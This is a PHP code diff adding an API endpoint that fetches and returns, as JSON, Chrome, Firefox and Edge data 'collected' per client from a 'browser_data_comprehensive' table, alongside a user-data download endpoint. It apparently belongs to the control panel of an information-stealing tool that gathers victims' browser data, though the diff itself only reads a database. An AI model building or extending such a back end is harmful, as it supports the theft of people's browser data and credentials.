@@ -425,6 +425,51 @@ function handleAPIRequests($pdo, $logged_in)
         exit;
     }
 
+    // ===== GET COMPREHENSIVE BROWSER DATA =====
+    if (isset($_GET['get_comprehensive_browser_data'])) {
+        header('Content-Type: application/json; charset=utf-8');
+        if (ob_get_length()) ob_clean();
+
+        try {
+            $stmt = $pdo->query("
+            SELECT id, client_id, chrome_data, firefox_data, edge_data, collected_at, created_at
+            FROM browser_data_comprehensive ORDER BY created_at DESC LIMIT 100
+        ");
+            $browser_data = $stmt->fetchAll();
+
+            logInfo("Fetched comprehensive browser data", ['count' => count($browser_data)]);
+
+            $processed = [];
+            foreach ($browser_data as $data) {
+                $processed_item = [
+                    'id' => $data['id'],
+                    'client_id' => $data['client_id'],
+                    'collected_at' => $data['collected_at'],
+                    'created_at' => $data['created_at']
+                ];
+
+                // Process browser data
+                if ($data['chrome_data']) {
+                    $processed_item['chrome_data'] = json_decode($data['chrome_data'], true);
+                }
+                if ($data['firefox_data']) {
+                    $processed_item['firefox_data'] = json_decode($data['firefox_data'], true);
+                }
+                if ($data['edge_data']) {
+                    $processed_item['edge_data'] = json_decode($data['edge_data'], true);
+                }
+
+                $processed[] = $processed_item;
+            }
+
+            echo json_encode(['comprehensive_browser_data' => cleanArray($processed)], JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE);
+        } catch (Exception $e) {
+            logError("get_comprehensive_browser_data failed", $e->getMessage());
+            sendJsonError('Failed to fetch comprehensive browser data: ' . $e->getMessage());
+        }
+        exit;
+    }
+
     // ===== DOWNLOAD USER DATA =====
     if (isset($_GET['download_user_data']) && isset($_GET['data_id'])) {
         try {
